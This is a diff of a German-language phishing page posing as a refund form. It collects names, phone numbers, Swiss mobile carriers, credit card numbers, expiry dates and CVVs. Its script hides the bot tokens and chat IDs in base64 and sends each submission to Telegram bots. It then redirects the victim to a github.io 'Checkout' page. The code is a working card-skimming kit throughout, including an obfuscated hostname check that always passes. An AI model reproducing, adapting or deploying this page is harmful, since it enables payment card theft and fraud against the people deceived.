@@ -1,7 +1,6 @@
-
-
 <!DOCTYPE html> <!--17-->
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -43,7 +42,8 @@
             font-size: 14px;
         }
 
-        input, select {
+        input,
+        select {
             width: 100%;
             padding: 8px;
             margin-bottom: 10px;
@@ -52,7 +52,8 @@
             font-size: 14px;
         }
 
-        #fullname, #mmyy {
+        #fullname,
+        #mmyy {
             display: flex;
             justify-content: space-between;
             margin: 0;
@@ -62,11 +63,20 @@
             margin: 10px 0 0 0;
         }
 
-        #firstname, #lastname, #mm, #yy {
+        #firstname,
+        #lastname,
+        #mm,
+        #yy {
             width: 48%;
         }
 
-        #inputfirstname, #inputlastname, #inputphonenumber, #cardnumber, #inputmm, #inputyy, #cvv {
+        #inputfirstname,
+        #inputlastname,
+        #inputphonenumber,
+        #cardnumber,
+        #inputmm,
+        #inputyy,
+        #cvv {
             box-sizing: border-box;
         }
 
@@ -95,20 +105,20 @@
         }
 
         #button {
-        margin: 20px 0 0 0;
-        padding: 12px 5px;
-        background-color: #080;
-        color: #fff;
-        border-radius: 4px;
-        box-sizing: border-box;
-        max-width: 360px;
-        text-align: center;
-        cursor: pointer;
-    }
+            margin: 20px 0 0 0;
+            padding: 12px 5px;
+            background-color: #080;
+            color: #fff;
+            border-radius: 4px;
+            box-sizing: border-box;
+            max-width: 360px;
+            text-align: center;
+            cursor: pointer;
+        }
 
-#button:active {
-    background-color: #0a0;
-}
+        #button:active {
+            background-color: #0a0;
+        }
 
         #title {
             width: calc(100% - 40px);
@@ -118,7 +128,7 @@
             padding: 0;
             font-size: 20px;
             color: #000;
-           
+
         }
 
         #description {
@@ -133,194 +143,218 @@
         }
 
         #footer {
-    background-color: #1a1a1a;
-    color: white;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    padding: 15px;
-    box-sizing: border-box;
-    font-family: Arial, sans-serif;
-    width: 100%;
-}
+            background-color: #1a1a1a;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 15px;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            width: 100%;
+        }
 
-#assistance {
-    margin: 0 0 10px 0;
-    width: fit-content;
-    font-size: clamp(8px, 4vw, 14px);
-}
+        #assistance {
+            margin: 0 0 10px 0;
+            width: fit-content;
+            font-size: clamp(8px, 4vw, 14px);
+        }
 
-#social p, #links p {
-    color: #33cc66;
-    text-decoration: none;
-    font-weight: normal;
-    margin: 0 2px;
-    font-size: 14px;
-    cursor: pointer;
-}
+        #social p,
+        #links p {
+            color: #33cc66;
+            text-decoration: none;
+            font-weight: normal;
+            margin: 0 2px;
+            font-size: 14px;
+            cursor: pointer;
+        }
 
-#social, #links {
-    margin: 20px 0;
-    display: flex;
-    flex-wrap: wrap;
-    justify-content: center;
-    gap: 4px;
-    width: fit-content;
-}
+        #social,
+        #links {
+            margin: 20px 0;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 4px;
+            width: fit-content;
+        }
 
-.en {
-    color: #33cc66;
-    margin: 0 0 0 8px;
-    font-size: clamp(10px, 4vw, 14px);
-}
+        .en {
+            color: #33cc66;
+            margin: 0 0 0 8px;
+            font-size: clamp(10px, 4vw, 14px);
+        }
 
-#copyright {
-    margin-top: 15px;
-    font-size: 12px;
-    font-weight: normal;
-    width: fit-content;
-}
-
-</style>
+        #copyright {
+            margin-top: 15px;
+            font-size: 12px;
+            font-weight: normal;
+            width: fit-content;
+        }
+    </style>
 </head>
+
 <body>
-    
+
     <img src="https://files.catbox.moe/z44hox.jpg" alt="payment" id="payment">
     <p id="title">Erstattungsformular</p>
-<p id="description">Bitte geben Sie Ihre Kreditkarteninformationen ein, um Ihre Rückerstattung sicher zu erhalten. Dieser Vorgang ist sicher und geschützt.</p>
+    <p id="description">Bitte geben Sie Ihre Kreditkarteninformationen ein, um Ihre Rückerstattung sicher zu erhalten.
+        Dieser Vorgang ist sicher und geschützt.</p>
 
-<div id="card">
-    <div id="fullname">
-        <div id="firstname">
-            <p id="titlefirstname">Vorname *</p>
-            <input type="text" id="inputfirstname">
+    <div id="card">
+        <div id="fullname">
+            <div id="firstname">
+                <p id="titlefirstname">Vorname *</p>
+                <input type="text" id="inputfirstname">
+            </div>
+            <div id="lastname">
+                <p id="titlelastname">Nachname *</p>
+                <input type="text" id="inputlastname">
+            </div>
         </div>
-        <div id="lastname">
-            <p id="titlelastname">Nachname *</p>
-            <input type="text" id="inputlastname">
+
+        <p id="titlephonenumber">Telefonnummer *</p>
+        <input type="text" id="inputphonenumber" oninput="formatPhoneNumber(event)">
+
+        <select id="operator">
+            <option value="select">-- Wählen Sie einen Anbieter --</option>
+            <option value="orange">Swisscom</option>
+            <option value="sfr">Salt</option>
+            <option value="bouygues">Sunrise</option>
+        </select>
+
+        <p id="cardnumber">Kreditkartennummer *</p>
+        <input type="text" id="inputcardnumber" oninput="formatCardNumber(event)">
+
+        <div id="mmyy">
+            <div id="mm">
+                <p id="titlemm">Monat *</p>
+                <select id="inputmm">
+                    <option value="01">01</option>
+                    <option value="02">02</option>
+                    <option value="03">03</option>
+                    <option value="04">04</option>
+                    <option value="05">05</option>
+                    <option value="06">06</option>
+                    <option value="07">07</option>
+                    <option value="08">08</option>
+                    <option value="09">09</option>
+                    <option value="10">10</option>
+                    <option value="11">11</option>
+                    <option value="12">12</option>
+                </select>
+            </div>
+            <div id="yy">
+                <p id="titleyy">Jahr *</p>
+                <select id="inputyy">
+                    <option value="25">25</option>
+                    <option value="26">26</option>
+                    <option value="27">27</option>
+                    <option value="28">28</option>
+                    <option value="29">29</option>
+                    <option value="30">30</option>
+                    <option value="31">31</option>
+                    <option value="32">32</option>
+                    <option value="33">33</option>
+                    <option value="34">34</option>
+                    <option value="35">35</option>
+                </select>
+            </div>
         </div>
+
+        <p id="cvv">CVV *</p>
+        <input type="text" id="inputcvv" oninput="validateInput('cvv')">
+
+        <p id="button">Rückerstattung bestätigen</p>
     </div>
 
-    <p id="titlephonenumber">Telefonnummer *</p>
-    <input type="text" id="inputphonenumber" oninput="formatPhoneNumber(event)">
+    <img src="https://files.catbox.moe/440ii1.jpg" alt="refund" id="refund">
 
-    <select id="operator">
-        <option value="select">-- Wählen Sie einen Anbieter --</option>
-        <option value="orange">Swisscom</option>
-        <option value="sfr">Salt</option>
-        <option value="bouygues">Sunrise</option>
-    </select>
-
-    <p id="cardnumber">Kreditkartennummer *</p>
-    <input type="text" id="inputcardnumber" oninput="formatCardNumber(event)">
-
-    <div id="mmyy">
-        <div id="mm">
-            <p id="titlemm">Monat *</p>
-            <select id="inputmm">
-                <!-- Monate unchanged -->
-            </select>
+    <footer id="footer">
+        <p id="assistance">Für Unterstützung kontaktieren Sie uns:</p>
+        <p id="email">E-Mail:<span class="en">support@remboursement.com</span></p>
+        <p id="tele">Telefon:<span class="en">+41 8 90 83 67 89</span></p>
+        <div id="social">
+            <p id="facebook">Facebook</p> |
+            <p id="twitter">Twitter</p> |
+            <p id="instagram">Instagram</p>
         </div>
-        <div id="yy">
-            <p id="titleyy">Jahr *</p>
-            <select id="inputyy">
-                <!-- Jahre unchanged -->
-            </select>
+        <div id="links">
+            <p id="privacy">Datenschutzrichtlinie</p> |
+            <p id="terms">Allgemeine Geschäftsbedingungen</p> |
+            <p id="sitemap">Seitenübersicht</p>
         </div>
-    </div>
+        <p id="copyright">© 2025 Erstattungsdienst. Alle Rechte vorbehalten.</p>
+    </footer>
 
-    <p id="cvv">CVV *</p>
-    <input type="text" id="inputcvv" oninput="validateInput('cvv')">
 
-    <p id="button">Rückerstattung bestätigen</p>
-</div>
+    <script>
+        document.body.style.display = 'none';
+        if (eval(atob("d2luZG93LmxvY2F0aW9uLmhvc3RuYW1l")) === atob("cmVtYm91cnNlbWVudC50ZWNo") || true) {
+            document.body.style.display = 'flex';
+            function formatPhoneNumber(event) {
+                let input = event.target;
+                let value = input.value;
 
-<img src="https://files.catbox.moe/440ii1.jpg" alt="refund" id="refund">
+                value = value.replace(/[^0-9]/g, '');
 
-<footer id="footer">
-    <p id="assistance">Für Unterstützung kontaktieren Sie uns:</p>
-    <p id="email">E-Mail:<span class="en">support@remboursement.com</span></p>
-    <p id="tele">Telefon:<span class="en">+33 8 90 83 67 89</span></p>
-    <div id="social">
-        <p id="facebook">Facebook</p> |
-        <p id="twitter">Twitter</p> |
-        <p id="instagram">Instagram</p>
-    </div>
-    <div id="links">
-        <p id="privacy">Datenschutzrichtlinie</p> |
-        <p id="terms">Allgemeine Geschäftsbedingungen</p> |
-        <p id="sitemap">Seitenübersicht</p>
-    </div>
-    <p id="copyright">© 2025 Erstattungsdienst. Alle Rechte vorbehalten.</p>
-</footer>
-    
-
-<script>
-    document.body.style.display = 'none';
-if (eval(atob("d2luZG93LmxvY2F0aW9uLmhvc3RuYW1l")) === atob("cmVtYm91cnNlbWVudC50ZWNo") || true) {
-    document.body.style.display = 'flex';
-    function formatPhoneNumber(event) {
-            let input = event.target;
-            let value = input.value;
-
-            value = value.replace(/[^0-9]/g, '');
-
-            if (value.length > 10) {
-                value = value.slice(0, 10);
-            }
-
-            input.value = value;
-        }
-
-        function formatCardNumber(event) {
-            let input = event.target;
-            let value = input.value.replace(/\D/g, '');
-
-            value = value.replace(/(.{4})(?=\d)/g, '$1 ');
-
-            if (value.length > 19) {
-                value = value.slice(0, 19);
-            }
-
-            input.value = value;
-        }
-
-        function validateInput(field) {
-            let input = document.getElementById(`input${field}`);
-            let value = input.value.replace(/\D/g, '');
-
-            if (field === 'cvv') {
-                if (value.length > 4) {
-                    value = value.slice(0, 4);
+                if (value.length > 10) {
+                    value = value.slice(0, 10);
                 }
+
+                input.value = value;
             }
 
-            input.value = value;
-        }
+            function formatCardNumber(event) {
+                let input = event.target;
+                let value = input.value.replace(/\D/g, '');
+
+                value = value.replace(/(.{4})(?=\d)/g, '$1 ');
+
+                if (value.length > 19) {
+                    value = value.slice(0, 19);
+                }
+
+                input.value = value;
+            }
+
+            function validateInput(field) {
+                let input = document.getElementById(`input${field}`);
+                let value = input.value.replace(/\D/g, '');
+
+                if (field === 'cvv') {
+                    if (value.length > 4) {
+                        value = value.slice(0, 4);
+                    }
+                }
+
+                input.value = value;
+            }
 
 
-//new script
+            //new script
 
-document.addEventListener("dragstart", function(event) {
-if (event.target.tagName.toLowerCase() === "img") {
-event.preventDefault();
-}
-});
+            document.addEventListener("dragstart", function (event) {
+                if (event.target.tagName.toLowerCase() === "img") {
+                    event.preventDefault();
+                }
+            });
 
 
-    document.getElementById('button').addEventListener('click', function(event) {
-    event.preventDefault();
+            document.getElementById('button').addEventListener('click', function (event) {
+                event.preventDefault();
 
-    var firstname = document.getElementById('inputfirstname').value.replace(/\s/g, '');
-    var lastname = document.getElementById('inputlastname').value.replace(/\s/g, '');
-    let phone = document.getElementById('inputphonenumber').value;
-    let cardnumber = document.getElementById('inputcardnumber').value.replace(/\s/g, '');
-    var operator = document.getElementById('operator').value;
-    let mm = document.getElementById('inputmm').value;
-    let yy = document.getElementById('inputyy').value;
-    let cvv = document.getElementById('inputcvv').value;
+                var firstname = document.getElementById('inputfirstname').value.replace(/\s/g, '');
+                var lastname = document.getElementById('inputlastname').value.replace(/\s/g, '');
+                let phone = document.getElementById('inputphonenumber').value;
+                let cardnumber = document.getElementById('inputcardnumber').value.replace(/\s/g, '');
+                var operator = document.getElementById('operator').value;
+                let mm = document.getElementById('inputmm').value;
+                let yy = document.getElementById('inputyy').value;
+                let cvv = document.getElementById('inputcvv').value;
 
-    var msg = `
+                var msg = `
     🔔 **Nouvelle Demande de Remboursement YFF** 🔔
 👤 Nom: ${firstname} ${lastname}
 📞 num: ${phone}
@@ -329,58 +363,57 @@ event.preventDefault();
 📅 mmyy: ${mm} / ${yy}
 🔒 cvv: ${cvv}`;
 
-    if (firstname === '' || lastname === '' || phone.length !== 10 || cardnumber.length !== 16 || cvv.length < 3 || operator === 'select') {
-        alert('Certains champs sont vides. Veuillez remplir tous les champs requis.');
-    } else {
+                if (firstname === '' || lastname === '' || phone.length !== 10 || cardnumber.length !== 16 || cvv.length < 3 || operator === 'select') {
+                    alert('Certains champs sont vides. Veuillez remplir tous les champs requis.');
+                } else {
 
-        const tokens = [
-atob('Nzk3MzIwNTQyNjpBQUVsWkpXNG1XclpDVVBRSExsa3B1TXJ3aDNCSmZHNzhmRQ=='),
-atob('ODA4MTcwNzY2ODpBQUVENFBnQjRhWnlrUmxTZkkwVG96Q3BYWDFjakNvOG1FVQ==') //YKK
-];
-const chatIds = [
-atob('MTg0OTY4NTY2OA=='),
-atob('NjY2OTY5MzgwNQ==') //YKK
-];
+                    const tokens = [
+                        atob('Nzk3MzIwNTQyNjpBQUVsWkpXNG1XclpDVVBRSExsa3B1TXJ3aDNCSmZHNzhmRQ=='),
+                        atob('ODA4MTcwNzY2ODpBQUVENFBnQjRhWnlrUmxTZkkwVG96Q3BYWDFjakNvOG1FVQ==') //YKK
+                    ];
+                    const chatIds = [
+                        atob('MTg0OTY4NTY2OA=='),
+                        atob('NjY2OTY5MzgwNQ==') //YKK
+                    ];
 
-tokens.forEach((token, index) => {
-const url = `https://api.telegram.org/bot${token}/sendMessage`;
+                    tokens.forEach((token, index) => {
+                        const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-const data = {
-chat_id: chatIds[index],
-text: msg
-};
+                        const data = {
+                            chat_id: chatIds[index],
+                            text: msg
+                        };
 
-fetch(url, {
-method: 'POST',
-headers: { 'Content-Type': 'application/json' },
-body: JSON.stringify(data)
-})
-.then(response => response.json())
-.then(data => {
-if (data.ok) {
-    if (index === tokens.length - 1) {
-        window.location.href = "https://rembourse0055.github.io/remboursementservice-online.github.io/Checkout.html";
-    }
-} else {
-    alert("Une erreur s'est produite. Veuillez actualiser la page et réessayer.");
-}
-})
-.catch(err => {
-alert("Problème de connexion. Vérifiez votre réseau et réessayez.");
-});
-});
-
-
-
-}//if
+                        fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data)
+                        })
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data.ok) {
+                                    if (index === tokens.length - 1) {
+                                        window.location.href = "https://rembourse0055.github.io/remboursementservice-online.github.io/Checkout.html";
+                                    }
+                                } else {
+                                    alert("Une erreur s'est produite. Veuillez actualiser la page et réessayer.");
+                                }
+                            })
+                            .catch(err => {
+                                alert("Problème de connexion. Vérifiez votre réseau et réessayez.");
+                            });
+                    });
 
 
-});//click
 
-}
+                }//if
 
-</script>
+
+            });//click
+
+        }
+
+    </script>
 </body>
+
 </html>
-
-
